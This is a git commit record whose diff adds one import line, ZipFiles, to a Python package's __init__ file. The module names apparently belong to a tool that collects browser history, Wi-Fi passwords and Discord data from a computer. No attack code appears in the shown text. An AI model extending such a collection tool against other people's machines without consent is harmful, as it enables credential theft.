367760225f4ee2ef152232570538f0aff9798a22
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2023-11-29 16:23:48 +0530

    import zipfiles

--- modules/__init__.py
+++ modules/__init__.py
@@ -2,3 +2,4 @@ from .browsers import WebBookmarksRecovery, WebHistoryRecovery, ChromiumRecovery
 from .network import NetworkInfoRecovery, WifiPasswordRecovery
 from .systeminfo import SystemInfoRecovery
 from .applications import DiscordRecovery
+from .applications import ZipFiles
